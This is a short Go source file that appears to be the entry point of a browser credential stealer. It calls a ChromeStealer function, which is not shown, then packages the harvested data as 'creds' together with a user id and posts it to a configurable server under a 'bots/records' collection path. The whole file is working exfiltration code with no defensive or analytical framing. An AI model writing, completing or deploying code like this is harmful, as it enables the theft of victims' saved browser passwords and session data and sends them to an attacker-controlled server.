package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
)

var ConfigUrl string
var ConfigUserId string

func main() {
	jsonString := ChromeStealer()

	fmt.Scanln()

	postBody, _ := json.Marshal(map[string]string{
		"country_code": "in",
		"ip":           "1.2.3.5",
		"creds":        jsonString,
		"user":         ConfigUserId,
	})
	responseBody := bytes.NewBuffer(postBody)

	resp, err := http.Post(ConfigUrl+"/api/collections/bots/records", "application/json", responseBody)
	if err != nil {
		log.Fatalln(err)
	}
	//We Read the response body on the line below.
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatalln(err)
	}
	//Convert the body to type string
	sb := string(body)
	log.Printf(sb)
}
